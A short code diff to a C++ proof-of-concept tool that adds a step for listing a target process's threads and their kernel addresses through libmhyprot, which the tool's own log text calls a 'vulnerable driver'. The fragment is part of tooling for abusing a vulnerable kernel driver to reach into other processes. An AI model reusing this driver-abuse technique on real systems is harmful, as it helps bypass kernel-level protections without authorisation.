@@ -275,6 +275,24 @@ int main()
         }
     }
 
+    UDBG("\n[>] snatching threads from target process using vulnerable driver...\n");
+
+    std::vector<MHYPROT_THREAD_INFORMATION> thread_list;
+
+    if (!libmhyprot::get_process_threads(process_id, process_id, thread_list))
+    {
+        UDBG("[<] failed to get process threads\n");
+    }
+    else
+    {
+        for (const auto& thread : thread_list)
+        {
+            UDBG("[+] ---> 0x%llX : 0x%llX : %d\n", thread.kernel_address, thread.start_address, thread.unknown);
+        }
+
+        UDBG("[<] snatched\n\n");
+    }
+
     UDBG("[<] done\n");
 
     libmhyprot::mhyprot_unload();
